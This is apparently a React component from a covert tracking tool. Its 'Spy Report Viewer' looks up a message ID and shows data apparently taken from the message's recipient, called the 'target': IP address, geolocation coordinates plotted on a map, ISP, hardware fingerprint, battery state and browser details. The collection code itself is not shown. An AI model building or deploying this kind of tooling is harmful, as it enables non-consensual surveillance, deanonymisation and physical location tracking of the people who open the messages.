'use client';

import React, { useState, useRef } from 'react';
import { supabase } from '@/lib/supabaseClient';
import MapDisplay from './MapDisplay';
import SpyMasterSearch from './SpyMaster';
import { useToast } from '../context/ToastContext';
import SpyDetails from './SystemDetails/SpyDetails';

interface SpyData {
  fingerPrint: string;
  masterId?: string;
  ip: string;
  city: string;
  country: string;
  lat: string;
  lon: string;
  isp: string;
  gpu: string;
  cpu_cores: number;
  ram_gb: number | string;
  battery_level: string;
  is_charging: boolean;
  screen_res: string;
  window_res: string;
  pixel_ratio: number;
  os_platform: string;
  user_agent: string;
  browser_lang: string;
  timezone: string;
  connection_type: string;
  downlink_speed: string;
}

const SpyReportViewer: React.FC = () => {
  const toast = useToast();
  const [messageId, setMessageId] = useState<string>('');
  const [report, setReport] = useState<SpyData | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const isFetching = useRef(false); // Prevent double fetch

  const fetchReport = async () => {
    if (isFetching.current) return;
    if (!messageId.trim()) {
      setError('Please enter a Message ID.');
      setReport(null);
      return;
    }

    isFetching.current = true;
    setIsLoading(true);
    setError(null);
    setReport(null);

    try {
      const { data, error: supabaseError } = await supabase
        .from('messages')
        .select('spy')
        .eq('id', messageId.trim())
        .single();

      if (supabaseError) throw supabaseError;

      if (data?.spy) {
        setReport(data.spy as SpyData);
        toast.success('Target data decrypted.');
      } else {
        setError(`No spy data found for ID: ${messageId}`);
      }
    } catch (e: unknown) {
      const err = e as Error;
      console.error('Fetch Error:', e);
      setError(`Access Denied: ${err.message || 'Unknown error'}`);
    } finally {
      setIsLoading(false);
      isFetching.current = false;
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter') fetchReport();
  };

  const DataRow = ({ label, value, highlight = false }: { label: string; value: string | number | boolean | null | undefined; highlight?: boolean }) => (
    <div className="flex justify-between items-start border-b border-green-900/30 pb-1.5 mb-1.5 last:border-0 gap-3">
      <span className="text-gray-500 font-mono text-[11px] shrink-0">{label}:</span>
      <span className={`font-mono text-right break-all text-[11px] ${highlight ? 'text-green-400 font-bold' : 'text-gray-300'}`}>
        {value === undefined || value === null || value === '' ? 'N/A' : String(value)}
      </span>
    </div>
  );

  const latitude = report ? Number(report.lat) : undefined;
  const longitude = report ? Number(report.lon) : undefined;
  const hasValidCoordinates = report && !isNaN(latitude!) && !isNaN(longitude!) && latitude !== 0 && longitude !== 0;

  // Extract OS name cleanly from user_agent
  const getOsName = (ua: string, platform: string): string => {
    if (!ua) return platform || 'Unknown';
    if (ua.includes('Windows')) return 'Windows';
    if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
    if (ua.includes('Android')) return 'Android';
    if (ua.includes('Mac')) return 'macOS';
    if (ua.includes('Linux')) return 'Linux';
    return platform || 'Unknown';
  };

  return (
    <div className="w-full max-w-2xl mx-auto mt-6 space-y-6">

      {/* MAIN TERMINAL CARD */}
      <div className="bg-[#0a0a0a] border border-green-900/30 rounded-xl p-5 sm:p-6 shadow-2xl relative overflow-hidden">

        {/* Scanline Effect */}
        <div className="absolute inset-0 pointer-events-none bg-[linear-gradient(transparent_50%,rgba(0,255,0,0.015)_50%)] bg-[length:100%_4px]" />

        {/* Header */}
        <h2 className="text-base font-bold mb-5 flex items-center gap-2 border-b border-green-900/50 pb-3 text-green-500 tracking-widest">
          <span className="relative flex h-3 w-3 shrink-0">
            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75" />
            <span className="relative inline-flex rounded-full h-3 w-3 bg-green-500" />
          </span>
          SPY REPORT VIEWER
        </h2>

        {/* Search Input */}
        <div className="mb-6 flex flex-col sm:flex-row gap-2">
          <input
            type="text"
            value={messageId}
            onChange={(e) => setMessageId(e.target.value)}
            onKeyDown={handleKeyDown}
            placeholder="Enter Target Message ID..."
            className="flex-grow p-3 bg-black/50 border border-green-900/50 rounded-lg text-green-300 placeholder-green-900/50 focus:outline-none focus:border-green-500/50 focus:ring-1 focus:ring-green-500/20 font-mono text-sm transition-all"
          />
          <button
            onClick={fetchReport}
            disabled={isLoading}
            className="px-5 py-3 bg-green-900/20 border border-green-500/30 text-green-400 font-bold rounded-lg hover:bg-green-500 hover:text-black transition-all uppercase tracking-wider text-xs disabled:opacity-50 disabled:cursor-not-allowed whitespace-nowrap"
          >
            {isLoading ? 'DECRYPTING...' : 'UNLOCK DATA'}
          </button>
        </div>

        {/* Error */}
        {error && (
          <div className="mb-5 p-3 bg-red-900/10 border border-red-500/30 text-red-400 rounded font-mono text-xs">
            ❌ {error}
          </div>
        )}

        {/* REPORT */}
        {report && (
          <div className="space-y-5 text-xs animate-in fade-in slide-in-from-bottom-3 duration-400">

            {/* Identity */}
            <div className="bg-green-900/10 p-4 rounded-lg border border-green-900/30">
              <h3 className="text-green-600 font-bold mb-3 uppercase tracking-widest border-b border-green-900/30 pb-1 text-[11px]">
                :: Target Identity
              </h3>
              <DataRow label="MASTER ID" value={report.masterId} highlight />
              <DataRow label="FINGERPRINT" value={report.fingerPrint} />
              <DataRow label="IP ADDRESS" value={report.ip} highlight />
            </div>

            {/* Geo + Network */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div className="bg-gray-900/30 p-4 rounded-lg border border-white/5">
                <h3 className="text-gray-500 font-bold mb-2 uppercase tracking-widest text-[10px]">:: Geo-Location</h3>
                <DataRow label="CITY" value={report.city} />
                <DataRow label="COUNTRY" value={report.country} />
                <DataRow label="ISP" value={report.isp} />
                <DataRow label="COORDS" value={`${report.lat}, ${report.lon}`} />
              </div>
              <div className="bg-gray-900/30 p-4 rounded-lg border border-white/5">
                <h3 className="text-gray-500 font-bold mb-2 uppercase tracking-widest text-[10px]">:: Network</h3>
                <DataRow label="CONNECTION" value={report.connection_type} />
                <DataRow label="SPEED" value={report.downlink_speed} />
                <DataRow label="TIMEZONE" value={report.timezone} />
                <DataRow label="LANG" value={report.browser_lang} />
              </div>
            </div>

            {/* Hardware */}
            <div className="bg-gray-900/30 p-4 rounded-lg border border-white/5">
              <h3 className="text-gray-500 font-bold mb-2 uppercase tracking-widest text-[10px]">:: Hardware Signature</h3>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-6">
                <DataRow label="OS" value={getOsName(report.user_agent, report.os_platform)} />
                <DataRow label="CPU CORES" value={report.cpu_cores} />
                <DataRow label="RAM" value={report.ram_gb} />
                <DataRow label="BATTERY" value={`${report.battery_level}${report.is_charging ? ' ⚡' : ''}`} highlight />
                <DataRow label="SCREEN" value={report.screen_res} />
                <DataRow label="GPU" value={report.gpu} />
                <DataRow label="PIXEL RATIO" value={report.pixel_ratio} />
                <DataRow label="WINDOW" value={report.window_res} />
              </div>
            </div>

            {/* User Agent */}
            <div className="pt-1 opacity-50 hover:opacity-100 transition-opacity">
              <p className="text-[10px] text-gray-600 font-mono break-all">UA: {report.user_agent}</p>
            </div>
          </div>
        )}

        {/* Idle State */}
        {!report && !isLoading && !error && (
          <div className="text-center py-10 opacity-30">
            <div className="w-14 h-14 mx-auto border-2 border-green-500/50 rounded-full flex items-center justify-center mb-3">
              <div className="w-2 h-2 bg-green-500 rounded-full animate-ping" />
            </div>
            <p className="text-green-500 font-mono text-xs">WAITING FOR TARGET ID...</p>
          </div>
        )}
      </div>

      {/* MAP */}
      {hasValidCoordinates && (
        <div className="border border-green-900/30 rounded-xl overflow-hidden shadow-lg bg-black">
          <div className="bg-green-900/20 px-4 py-2 text-[10px] font-mono text-green-400 border-b border-green-900/30 flex justify-between flex-wrap gap-2">
            <span>LOCATION TRIANGULATED</span>
            <span>{report?.lat}, {report?.lon}</span>
          </div>
          <MapDisplay />
        </div>
      )}
      {report && !hasValidCoordinates && (
        <div className="p-4 bg-yellow-900/10 border border-yellow-600/30 text-yellow-500/80 rounded-xl text-xs text-center font-mono">
          [!] UNABLE TO TRIANGULATE EXACT POSITION — VPN or proxy detected
        </div>
      )}

      <SpyMasterSearch />
      <br />
      <SpyDetails />
    </div>
  );
};

export default SpyReportViewer;
